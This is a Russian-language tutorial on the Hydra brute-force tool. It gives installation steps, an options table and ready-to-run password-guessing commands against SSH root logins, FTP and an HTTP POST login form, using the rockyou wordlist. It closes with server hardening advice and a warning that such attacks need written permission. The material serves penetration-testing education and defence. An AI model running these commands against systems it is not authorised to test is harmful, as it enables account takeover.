### **Использование Hydra для подбора паролей (Brute-Force)**
`hydra` — это мощный инструмент для brute-force атак, который поддерживает множество протоколов (SSH, FTP, HTTP, RDP и др.).  

#### **1. Установка Hydra**
На **Kali Linux / Debian**:
```bash
sudo apt update && sudo apt install hydra
```
На **Arch Linux**:
```bash
sudo pacman -S hydra
```
На **Fedora / RHEL**:
```bash
sudo dnf install hydra
```
На **ALT / Ximper**:
```bash
sudo epmi hydra
```



#### **2. Основной синтаксис Hydra**
```bash
hydra -l <username> -P <wordlist> <protocol>://<target_IP> -s <port> -t <threads> -vV
```
| Опция | Описание |
|--------|------------|
| `-l` | Логин (например, `root`, `admin`) |
| `-L` | Файл со списком логинов |
| `-p` | Один пароль (например, `password123`) |
| `-P` | Файл со списком паролей (например, `rockyou.txt`) |
| `-s` | Порт (по умолчанию зависит от протокола) |
| `-t` | Количество потоков (по умолчанию `16`) |
| `-vV` | Подробный вывод (`-v` — минимальный, `-V` — с деталями) |
| `-o` | Сохранить результат в файл (`-o found.txt`) |



### **3. Примеры атак**
#### **1. Атака на SSH (подбор пароля для root)**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.87.31 -t 4 -vV
```
- `-t 4` — уменьшает количество потоков, чтобы избежать блокировки.
- Если SSH на нестандартном порту (например, `2222`), добавьте `-s 2222`.

#### **2. Атака на FTP**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.87.31 -vV
```

#### **3. Атака на HTTP-форму (POST-запрос)**
Если есть веб-форма входа (например, `/login.php`):
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.87.31 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -vV
```
- `F=incorrect` означает, что Hydra ищет слово `incorrect` в ответе (неудачный вход).



### **4. Где взять wordlists (словари паролей)?**
- **Kali Linux**: `/usr/share/wordlists/`  
  Популярные словари:
  - `rockyou.txt` (обычные пароли)
  - `fasttrack.txt` (простые пароли)
  - `darkweb2017-top1000.txt` (утечки)
- **Скачать дополнительные**:
  ```bash
  wget https://github.com/danielmiessler/SecLists/archive/master.zip
  unzip master.zip
  ```



### **5. Как защититься от Hydra?**
Если вы админ и хотите защитить сервер:
1. **Изменить порт SSH** (не `22`).
2. **Запретить вход root по SSH** (`/etc/ssh/sshd_config`):
   ```ini
   PermitRootLogin no
   ```
3. **Использовать Fail2Ban** для блокировки brute-force:
   ```bash
   sudo apt install fail2ban
   ```
4. **Включить аутентификацию по ключу** (отключить пароли):
   ```ini
   PasswordAuthentication no
   ```



### **6. Важно!**
- **Brute-force без разрешения владельца системы — незаконен!**  
- Используйте только в тестовых средах (CTF, HackTheBox, VulnHub) или на своих серверах.
- Если сервер чужой — **нужно письменное разрешение (PenTest contract)**.




